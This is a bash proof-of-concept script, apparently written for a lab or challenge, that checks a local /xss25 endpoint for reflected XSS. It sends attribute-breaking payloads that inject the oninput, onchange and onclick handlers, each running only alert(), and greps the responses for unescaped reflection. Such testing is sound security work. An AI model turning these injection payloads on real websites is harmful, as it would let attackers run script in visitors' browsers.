#!/bin/bash

# POC: Reflected XSS via Unfiltered Event Handlers in /xss25
# This script demonstrates a vulnerability where event handlers like 'oninput' 
# are not properly filtered in the /xss25 endpoint

TARGET_URL="http://localhost:5000/xss25"

echo "=========================================="
echo "Reflected XSS POC - Unfiltered Event Handlers"
echo "=========================================="
echo ""

# Test 1: Basic oninput event handler injection
echo "[*] Test 1: Injecting 'oninput' event handler"
echo "[*] Payload: solution=\" oninput=\"alert(1)"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL" -d 'solution=" oninput="alert(1)' -H "Content-Type: application/x-www-form-urlencoded")

echo "[*] Response received:"
echo "$RESPONSE"
echo ""

# Check if the payload is reflected without escaping
if echo "$RESPONSE" | grep -q 'oninput='; then
    echo "[+] VULNERABLE: 'oninput' event handler was reflected in the response without proper escaping!"
    echo "[+] Event handler injection successful - JavaScript would execute in browser context"
else
    echo "[-] Event handler not found in response"
fi

echo ""
echo "=========================================="
echo ""

# Test 2: onchange event handler injection
echo "[*] Test 2: Injecting 'onchange' event handler"
echo "[*] Payload: solution=\" onchange=\"alert(2)"
echo ""

RESPONSE2=$(curl -s -X POST "$TARGET_URL" -d 'solution=" onchange="alert(2)' -H "Content-Type: application/x-www-form-urlencoded")

echo "[*] Response received:"
echo "$RESPONSE2"
echo ""

if echo "$RESPONSE2" | grep -q 'onchange='; then
    echo "[+] VULNERABLE: 'onchange' event handler was reflected without escaping!"
else
    echo "[-] Event handler not found in response"
fi

echo ""
echo "=========================================="
echo ""

# Test 3: Verify that common handlers ARE filtered
echo "[*] Test 3: Verify that common handlers (onclick) ARE filtered"
echo "[*] Payload: solution=\" onclick=\"alert(3)"
echo ""

RESPONSE3=$(curl -s -X POST "$TARGET_URL" -d 'solution=" onclick="alert(3)' -H "Content-Type: application/x-www-form-urlencoded")

echo "[*] Response received:"
echo "$RESPONSE3"
echo ""

if echo "$RESPONSE3" | grep -q 'onclick='; then
    echo "[*] onclick handler was NOT filtered (also vulnerable)"
else
    echo "[+] onclick handler WAS filtered (as expected by the application's logic)"
fi

echo ""
echo "=========================================="
echo "POC Complete"
echo "=========================================="